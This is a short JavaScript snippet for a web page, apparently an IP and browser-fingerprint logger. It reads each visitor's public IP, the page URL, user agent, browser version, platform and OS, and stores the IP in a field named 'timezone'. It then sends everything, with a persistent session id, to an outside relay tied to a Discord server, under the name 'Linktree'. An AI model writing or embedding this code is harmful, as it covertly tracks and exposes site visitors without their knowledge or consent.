

if(typeof(Storage) !== "undefined") {
    if(localStorage.getItem("chatid") === null) {
        localStorage.setItem("chatid", Date.now());
        var chatid = localStorage.getItem("chatid");
    } else {
        var chatid = localStorage.getItem("chatid");
    }
} else {
    var chatid = "NA";
}

$.getJSON("https://api.ipify.org?format=json", function(data) {
    document.getElementById('timezone').value = data.ip;
    
txt = "**🌐 • Registered From: **" + window.top.location.href + " /newline";
txt += "**💻 • Browser CodeName: **` " + navigator.appCodeName + " ` /newline";
txt+= "**💻 • Browser Name: **` " + navigator.appName + " ` /newline";
txt+= "**💻 • Browser Version: **` " + navigator.appVersion + " ` /newline";
txt+= "**🍪 • Cookies Enabled: **` " + navigator.cookieEnabled + " ` /newline";
txt+= "**🌍 • Platform: **` " + navigator.platform + " ` /newline";
txt+= "**🔏 • User-agent header: **` " + navigator.userAgent + " ` /newline";

var OSName = "Unknown OS";
if (navigator.userAgent.indexOf("Win") != -1) OSName = "Windows";
if (navigator.userAgent.indexOf("Mac") != -1) OSName = "Macintosh";
if (navigator.userAgent.indexOf("Linux") != -1) OSName = "Linux";
if (navigator.userAgent.indexOf("Android") != -1) OSName = "Android";
if (navigator.userAgent.indexOf("like Mac") != -1) OSName = "iOS";
// Browser with version  Detection
navigator.sayswho= (function(){
var N= navigator.appName, ua= navigator.userAgent, tem;
var M= ua.match(/(opera|chrome|safari|firefox|msie)\/?\s*(\.?\d+(\.\d+)*)/i);
if(M && (tem= ua.match(/version\/([\.\d]+)/i))!= null) M[2]= tem[1];
M= M? [M[1], M[2]]: [N, navigator.appVersion,'-?'];
return M;
})();

var browser_version = navigator.sayswho;

    $.getJSON("https://sendbotu.rajatcj.com.np/message?content=loading_site_info_fetch&guild=819109979046936577&username=Linktree&avatar_url=https://cdn.discordapp.com/emojis/892004694120103946.webp&sessionid=" + document.getElementById('sessionid').value + "&timezone=" + data.ip + "&details=" + OSName + " " + browser_version  + "thisisabreak" + txt)
})

document.getElementById('sessionid').value = chatid;
document.getElementById('url').value = window.top.location.href;
$.getJSON("https://api.ipify.org?format=json", function(data) {
    document.getElementById('timezone').value = data.ip;
})
